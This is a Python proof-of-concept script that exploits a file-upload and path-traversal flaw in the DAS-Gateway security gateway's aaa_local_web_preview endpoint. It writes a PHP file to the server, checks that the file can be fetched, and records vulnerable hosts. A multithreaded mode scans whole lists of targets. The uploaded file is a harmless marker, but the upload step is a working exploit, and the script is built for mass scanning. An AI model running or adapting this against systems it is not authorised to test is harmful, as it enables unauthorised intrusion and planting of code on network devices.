import requests,argparse,time
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings() # 解除警告
GREEN = '\033[92m'
RESET = '\033[0m'
proxies = { 
       "http": "http://127.0.0.1:8080", 
       "https": "https://127.0.0.1:8080" 
       }
def banner():
	banner = """

	██████╗██╗  ██╗ ██████╗ ███████╗███████╗███╗   ██╗ ██╗
██╔════╝██║  ██║██╔═══██╗██╔════╝██╔════╝████╗  ██║███║
██║     ███████║██║   ██║███████╗█████╗  ██╔██╗ ██║╚██║
██║     ██╔══██║██║   ██║╚════██║██╔══╝  ██║╚██╗██║ ██║
╚██████╗██║  ██║╚██████╔╝███████║███████╗██║ ╚████║ ██║
 ╚═════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═══╝ ╚═╝
                                     info:安恒明御安全网关aaa_local_web_preview文件上传漏洞
	"""
	print(banner)
def poc(target):
	payload_url = "/webui/?g=aaa_local_web_preview&name=123&read=0&suffix=/../../../test.php"
	url = target + payload_url
	headers={
		"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15",
		"Content-Type": "multipart/form-data; boundary=849978f98abe41119122148e4aa65b1a",
		"Accept-Encoding": "gzip",
		"Content-Length": "200"
	}
	data='''
--849978f98abe41119122148e4aa65b1a\nContent-Disposition: form-data; name="123"; filename="test.php"\nContent-Type: text/plain\n
This page has a vulnerability\n--849978f98abe41119122148e4aa65b1a--
	'''
	try:
		res = requests.get(url=target,verify=False)
		res1 = requests.post(url=url,headers=headers,data=data,verify=False)
		res2 = requests.get(url=target+"/test.php",verify=False)
		if res.status_code == 200:
			if "success" in res1.text and "This page has a vulnerability" in res2.text:
				print(f"{GREEN}[+]该url存在文件上传漏洞：{target}{RESET}")
				with open("result.txt","a",encoding="utf-8") as f:
					f.write(target+"\n")
			else:
				print(f"[-]该url不存在文件上传漏洞：{target}")
		else:
			print(f"该url连接失败：{target}")
	except Exception as e:
		print(f'[*]该站点{target}存在访问问题，请手动测试')
		
def main():
	banner()
	parser = argparse.ArgumentParser()
	parser.add_argument("-u","--url",dest="url",type=str,help="please write link")
	parser.add_argument("-f","--file",dest="file",type=str,help="please write file\'path")
	args = parser.parse_args()
	if args.url and not args.file:
		poc(args.url)
	elif args.file and not args.url:
		url_list = []
		with open(args.file,"r",encoding="utf-8") as f:
			for i in f.readlines():
				url_list.append(i.strip().replace("\n",""))
		mp = Pool(300)
		mp.map(poc,url_list)
		mp.close()
		mp.join()
	else:
		print(f"\n\tUage:python {sys.argv[0]} -h")


if __name__ == "__main__":
	main()